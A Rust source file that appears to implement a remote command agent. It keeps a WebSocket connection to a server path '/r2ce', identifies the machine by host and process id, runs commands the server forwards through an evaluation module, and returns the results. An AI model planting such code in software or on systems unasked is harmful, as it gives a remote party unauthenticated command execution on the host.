use embedded_websocket::{
    framer::{Framer, FramerError},
    WebSocketClient, WebSocketOptions, WebSocketSendMessageType,
};
use serde_json::json;
use std::net::TcpStream;
use tokio::{sync::mpsc::UnboundedSender, time};

use crate::eval_command;

const PROTO: &str = "http";
const ACTION_ID: &str = "id";
const ACTION_JOIN: &str = "join";
const ACTION_FORWARD: &str = "forward";
const ACTION_RESPOND: &str = "respond";

pub(crate) fn init(tx: UnboundedSender<String>, host: String) {
    println!("[{}] {}", "socket", "init");
    tx.send("SOCKET.init".to_string()).unwrap();
    tokio::spawn(async move {
        let mut interval = time::interval(time::Duration::from_secs(5));
        loop {
            let socket_run_result = run_socket_async(tx.clone(), host.clone()).await;
            if socket_run_result.is_ok() {
                println!("[{}] {}", "socket", "started");
                tx.send("SOCKET.init".to_string()).unwrap();
            } else {
                println!("[{}] {}", "socket", "failed - will retry");
                interval.tick().await;
            }
        }
    });
}

async fn run_socket_async(tx: UnboundedSender<String>, host: String) -> Result<(), FramerError> {
    println!("[{}] {}", "socket", "run");
    let mut read_buf: [u8; 4000] = [0; 4000];
    let mut write_buf: [u8; 4000] = [0; 4000];
    let mut frame_buf: [u8; 4000] = [0; 4000];
    let mut socket_id = "non-id".to_string();
    let identifier = eval_command::get_identifier();

    let mut ws_client = WebSocketClient::new_client(rand::thread_rng());
    let origin = format!("{}://{}", PROTO, host).to_owned();

    let websocket_options = WebSocketOptions {
        path: "/r2ce",
        host: "localhost",
        origin: origin.as_str(),
        sub_protocols: None,
        additional_headers: None,
    };

    let mut stream = TcpStream::connect(host)?;
    let mut websocket = Framer::new(&mut read_buf, &mut write_buf, &mut ws_client, &mut stream);
    websocket.connect(&websocket_options)?;

    tx.send("SOCKET.STARTED".to_string()).unwrap();

    // send join message
    let message = format!("{}<<<server<<<{}@{}", ACTION_JOIN, identifier.host, identifier.pid);
    websocket.write(WebSocketSendMessageType::Text, true, message.as_bytes())?;

    while let Some(data) = websocket.read_text(&mut frame_buf)? {
        // todo data packets <<<>>>
        println!("[{}] {} {}", "socket", "received: ", data);
        tx.send("SOCKET.RECEIVED".to_string()).unwrap();

        let args: Vec<&str> = data.split("<<<").collect();
        let action = args[0];
        let payload = args[2];

        match action {
            ACTION_ID => {
                socket_id = payload.to_string();
            }
            ACTION_FORWARD => {
                let result = eval_command::evaluate_command(payload);
                let response = json!(result).to_string();
                let message = format!("{}<<<{}<<<{}", ACTION_RESPOND, socket_id, response).to_owned();
                websocket.write(WebSocketSendMessageType::Text, true, message.as_bytes())?;
            }
            _ => {
                println!("[{}] {} {}", "socket", "invalid message: ", data);
            }
        }
    }

    println!("[{}] {}", "socket", "closed");
    Ok(())
}
